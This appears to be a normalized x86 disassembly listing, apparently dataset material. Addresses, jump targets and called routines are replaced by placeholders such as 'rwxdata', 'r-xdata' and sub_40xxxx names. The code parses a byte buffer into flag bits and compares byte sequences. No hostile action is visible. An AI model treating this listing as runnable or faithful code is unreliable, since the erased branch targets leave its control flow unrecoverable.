mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x80
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x18 ]
or edx 0x2
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x40
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x58 ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
or eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x20
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
or ecx 0x2
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x10
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x58 ]
add ecx 0x1
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x54 ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x58 ]
or edx 0x1
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x8
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x54 ]
or ecx 0x2
mov [ ebp - 0x54 ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x54 ]
add ecx 0x1
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x54 ]
or edx 0x1
mov [ ebp - 0x54 ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x2
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x50 ]
or ecx 0x2
mov [ ebp - 0x50 ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
mov ecx [ ebp - 0x1c ]
mov edx [ ecx * 4 + rwxdata ]
mov [ eax * 4 + rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x50 ]
add ecx 0x1
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x4c ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x50 ]
or edx 0x1
mov [ ebp - 0x50 ] edx
mov ecx [ ebp - 0x20 ]
cmp ecx [ rwxdata ]
jge r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4c ]
or ecx 0x2
mov [ ebp - 0x4c ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x4c ]
add ecx 0x1
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4c ]
or edx 0x1
mov [ ebp - 0x4c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x48 ]
or ecx 0x2
mov [ ebp - 0x48 ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x48 ]
add ecx 0x1
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x38 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x37 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x36 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x35 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x34 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x33 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x32 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x31 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x30 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x2f ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x2e ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x2d ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x2c ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x2b ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x2a ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x29 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x28 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x27 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x26 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov al [ edx + rwxdata ]
mov [ ebp - 0x25 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov [ rwxdata ] 0x0
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x68 ] edx
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x48 ]
or edx 0x1
mov [ ebp - 0x48 ] edx
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
jne r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
push 0x0
mov edx [ ebp + 0x10 ]
push edx
mov eax [ rwxdata ]
push eax
call sub_40bfa1
add esp 0xc
mov [ rwxdata ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x20 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov edx [ rwxdata ]
push edx
call sub_40c09d
add esp 0x4
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
push ecx
call sub_406bf0
add esp 0x4
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40bea9
add esp 0x4
cmp eax [ ebp + 0x14 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x48 ]
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
mov eax [ ebp - 0x14 ]
movzx ecx [ ebp + eax - 0x28 ]
cmp edx ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x10 ]
or edx 0x1000
mov [ ebp - 0x10 ] edx
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x48 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
or eax 0x800
mov [ ebp - 0x10 ] eax
mov eax [ rwxdata ]
push eax
call sub_40b923
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x58 ]
jge r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
or ecx 0x400
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x58 ]
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
mov eax [ ebp - 0x14 ]
movzx ecx [ ebp + eax - 0x38 ]
cmp edx ecx
jne r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x4
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x10 ]
or edx 0x200
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x58 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x10
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
or edx 0x2
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
or eax 0x100
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x54 ]
jge r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
movzx edx [ rwxdata ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
or ecx 0x80
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x54 ]
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
mov eax [ ebp - 0x14 ]
movzx ecx [ ebp + eax - 0x34 ]
cmp edx ecx
jne r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x4
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov edx [ rwxdata ]
mov eax [ ebp - 0x4 ]
mov [ edx * 4 + rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x10 ]
or edx 0x40
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x54 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x20
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
or edx 0x2
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
or eax 0x20
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x50 ]
jge r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x10
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
movzx edx [ rwxdata ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x20 ]
cmp ecx [ rwxdata ]
jge r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
or ecx 0x10
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x50 ]
jne r-xdata
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
mov ecx [ ebp - 0x14 ]
movzx edx [ ebp + ecx - 0x30 ]
cmp eax edx
jne r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov edx [ rwxdata ]
mov eax [ ebp - 0x4 ]
mov [ edx * 4 + rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x10 ]
or edx 0x8
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x50 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] 0x40
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
or edx 0x4
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
or eax 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x4c ]
jge r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x20
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x2
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
or ecx 0x2
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x4c ]
jne r-xdata
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
mov eax [ ebp - 0x14 ]
movzx ecx [ ebp + eax - 0x2c ]
cmp edx ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
or edx 0x10
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
movzx eax [ rwxdata ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x5c ] 0x0
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x10 ]
or edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x4c ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x80
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
mov ecx [ ebp - 0x4 ]
mov [ eax * 4 + rwxdata ] ecx
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
push r--data
mov edx [ rwxdata ]
add edx rwxdata
push edx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x5c ]
or eax 0x8
mov [ ebp - 0x5c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x40
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x4
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x5c ]
or ecx 0x4
mov [ ebp - 0x5c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x20
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
or edx 0x2
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x5c ]
or edx 0x2
mov [ ebp - 0x5c ] edx
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
or edx 0x10
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
movzx edx [ rwxdata ]
test edx edx
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x5c ]
add edx 0x1
mov [ ebp - 0x5c ] edx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x68 ] eax
mov [ rwxdata ] 0x0
mov [ ebp - 0x3c ] 0x0
mov ecx [ ebp - 0x68 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x5c ]
or eax 0x1
mov [ ebp - 0x5c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
mov edx [ rwxdata ]
mov eax [ ebp - 0x4 ]
mov [ edx * 4 + rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0xc
add eax [ rwxdata ]
mov [ rwxdata ] eax
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x20 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x4
mov [ ebp - 0x4 ] ecx
push r--data
mov ecx [ rwxdata ]
add ecx rwxdata
push ecx
call sub_40b771
add esp 0x8
xor eax eax
mov ecx [ ebp - 0x68 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
